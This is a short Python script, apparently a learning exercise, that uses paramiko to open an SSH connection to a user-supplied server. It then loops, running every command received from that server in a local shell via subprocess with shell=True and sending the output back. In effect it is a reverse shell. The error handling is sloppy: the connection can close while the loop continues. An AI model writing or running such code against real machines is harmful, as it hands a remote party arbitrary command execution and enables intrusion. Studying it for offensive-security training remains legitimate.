import paramiko
import subprocess
import shlex

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command + '\n')
    data = ssh_session.recv(1024).decode()
    print(data)
    while True:
        cmd = ssh_session.recv(1024).decode()
        if not cmd:
            continue
        else:
            try:
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(cmd, shell=True)
                ssh_session.send(cmd_output or 'okey')
            except Exception as e:
                ssh_session.send(str(e))
                client.close()
    client.close()
    return


# ip = '127.0.0.1'
# user = 'artemdanilishin'
# port = 2222
# password = 'password'
if __name__ == "__main__":
    import getpass
    user = input('Username: ')
    password = getpass.getpass()
    ip = input('Enter server IP: ')
    port = input('Enter server port: ')
    ssh_command(ip, port, user, password, 'echo "Client connected"')